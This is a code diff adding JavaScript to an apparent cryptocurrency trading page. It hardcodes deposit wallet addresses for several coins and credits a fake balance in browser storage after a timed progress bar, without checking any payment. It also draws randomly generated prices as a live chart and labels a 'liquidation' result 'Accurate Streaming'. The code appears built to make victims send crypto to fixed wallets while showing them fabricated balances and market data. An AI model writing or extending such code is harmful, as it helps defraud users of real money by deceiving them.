@@ -789,51 +789,214 @@ document.addEventListener("DOMContentLoaded",()=>{
     });
   }
 });
+<script>
+// ================= SAFE INIT =================
+document.addEventListener("DOMContentLoaded", () => {
 
-function updateThemeText(){
-  const themeBtn=document.getElementById("themeToggle");
-  if(!themeBtn) return;
+// ================= WALLET =================
+let wallets = {
+ "USDT-ERC20":"0xe5bc64a8ecb7e9be8161010959d20570968add91",
+ "USDT-TRC20":"TY3GGqzDi9sSivC8Y9WnsKS8KYVa599WkE",
+ "SOL":"E9iGT7beby9DEsGxPM3t4xJMjDKkR6fTuHriwjH3uUKy",
+ "BTC":"15GJLYrc7j2ywhWuQEH1JdDK4UGrprnrLG",
+ "BNB":"0xe5bc64a8ecb7e9be8161010959d20570968add91"
+};
 
-  themeBtn.textContent =
-  document.body.classList.contains("dark") ? "☀️ Light" : "🌙 Dark";
+// ================= ELEMENTS =================
+const balanceEl = document.getElementById("balance");
+const historyEl = document.getElementById("history");
+
+// ================= LOAD BALANCE =================
+let balance = parseFloat(localStorage.getItem("balance"));
+
+if (isNaN(balance)) {
+  balance = 0;
+  localStorage.setItem("balance", balance);
+}
+
+// ================= UPDATE BALANCE UI =================
+function updateBalance(){
+  balanceEl.innerText = "$" + balance.toFixed(2);
+}
+updateBalance();
+
+// ================= HISTORY =================
+function saveHistory(text){
+  let list = JSON.parse(localStorage.getItem("history")) || [];
+  list.push(text + " | " + new Date().toLocaleTimeString());
+  localStorage.setItem("history", JSON.stringify(list));
+  loadHistory();
+}
+
+function loadHistory(){
+  historyEl.innerHTML = "";
+  let list = JSON.parse(localStorage.getItem("history")) || [];
+  list.forEach(item=>{
+    historyEl.innerHTML += `<li>${item}</li>`;
+  });
+}
+loadHistory();
+
+// ================= WALLET FUNCTIONS =================
+window.openDeposit = function(){
+  document.getElementById("depositPopup").style.display="flex";
+  document.body.classList.add("popup-open");
+  updateWallet();
+}
+
+window.closeDeposit = function(){
+  document.getElementById("depositPopup").style.display="none";
+  document.body.classList.remove("popup-open");
+  resetProgressBar();
+}
+
+function updateWallet(){
+  const net = document.getElementById("networkSelect").value;
+  document.getElementById("walletAddress").innerText = wallets[net];
+}
+
+window.copyWallet = function(){
+  navigator.clipboard.writeText(document.getElementById("walletAddress").innerText);
+  alert("Wallet Address Copied!");
+}
+
+// ================= PROGRESS BAR =================
+function resetProgressBar(){
+  const bar = document.getElementById("depositProgressBar");
+  bar.style.width = "0%";
+  bar.textContent = "0%";
+}
+
+// ================= DEPOSIT SYSTEM =================
+window.confirmDeposit = function(){
+  let amount = parseFloat(document.getElementById("depositAmount").value);
+
+  if (!amount || amount <= 0){
+    alert("Enter valid amount");
+    return;
+  }
+
+  const bar = document.getElementById("depositProgressBar");
+  let progress = 0;
+
+  const run = setInterval(()=>{
+    progress++;
+    bar.style.width = progress + "%";
+    bar.textContent = progress + "%";
+
+    if(progress >= 100){
+      clearInterval(run);
+
+      // ✅ ADD TO BALANCE
+      balance += amount;
+
+      // ✅ SAVE
+      localStorage.setItem("balance", balance);
+
+      // ✅ HISTORY
+      saveHistory("Deposit +" + amount);
+
+      // ✅ UPDATE UI
+      updateBalance();
+
+      bar.textContent = "Deposit Successful!";
+
+      setTimeout(closeDeposit, 1200);
+    }
+
+  }, 30);
+};
+
+// ================= REDIRECT =================
+window.redirectWithLoader = function(url){
+  const loader = document.getElementById("loader");
+  loader.classList.remove("hidden");
+  setTimeout(()=> window.location.href = url, 1500);
+};
+
+// ================= THEME =================
+const themeBtn = document.getElementById("themeToggle");
+
+if(themeBtn){
+  const savedTheme = localStorage.getItem("theme");
+  if(savedTheme) document.body.className = savedTheme;
+
+  themeBtn.addEventListener("click", ()=>{
+    document.body.classList.toggle("dark");
+    localStorage.setItem("theme", document.body.className);
+  });
 }
 
 // ================= LIQUIDATION =================
-function openLiquidation(){
+window.openLiquidation = function(){
   document.getElementById("liquidationPopup").style.display="flex";
-  document.body.classList.add("popup-open");
 }
 
-function closeLiquidation(){
+window.closeLiquidation = function(){
   document.getElementById("liquidationPopup").style.display="none";
-  document.body.classList.remove("popup-open");
 }
 
-function startLiquidation(){
- let amount=document.getElementById("liqAmount").value;
- let value=document.getElementById("liqValue").value;
- let target=parseInt(document.getElementById("liqPercent").value);
+window.startLiquidation = function(){
+ let amount = document.getElementById("liqAmount").value;
+ let value = document.getElementById("liqValue").value;
+ let target = parseInt(document.getElementById("liqPercent").value);
 
- let bar=document.getElementById("liqBar");
- let result=document.getElementById("liqResult");
+ let bar = document.getElementById("liqBar");
+ let result = document.getElementById("liqResult");
 
- let progress=0;
+ let progress = 0;
 
- let run=setInterval(()=>{
+ let run = setInterval(()=>{
   progress++;
-  bar.style.width=progress+"%";
-  bar.innerText=progress+"%";
+  bar.style.width = progress + "%";
+  bar.innerText = progress + "%";
 
-  if(progress>=target){
+  if(progress >= target){
     clearInterval(run);
 
-    result.innerHTML=
-    "Amount: "+amount+"<br>"+
-    "Value: "+value+"<br>"+
-    "Percentage: "+target+"%<br><br>"+
-    "<b style='color:#00c087'>Accurate Streaming</b>";
+    result.innerHTML =
+      "Amount: " + amount + "<br>" +
+      "Value: " + value + "<br>" +
+      "Percentage: " + target + "%<br><br>" +
+      "<b style='color:#00c087'>Accurate Streaming</b>";
   }
 
  },30);
+};
+
+// ================= SIMPLE CHART (UNCHANGED CORE) =================
+const canvas = document.getElementById("chart");
+const ctx = canvas.getContext("2d");
+
+canvas.width = canvas.offsetWidth;
+canvas.height = 320;
+
+let candles = [];
+let basePrice = 50000;
+
+function draw(){
+  ctx.clearRect(0,0,canvas.width,canvas.height);
+
+  basePrice += (Math.random() - 0.5) * 100;
+
+  candles.push(basePrice);
+  if(candles.length > 40) candles.shift();
+
+  ctx.beginPath();
+
+  candles.forEach((p,i)=>{
+    let x = i * (canvas.width / 40);
+    let y = canvas.height - (p - 49000) / 100;
+
+    if(i===0) ctx.moveTo(x,y);
+    else ctx.lineTo(x,y);
+  });
+
+  ctx.strokeStyle = "#00c087";
+  ctx.stroke();
 }
+
+setInterval(draw,1000);
+
+});
 </script>
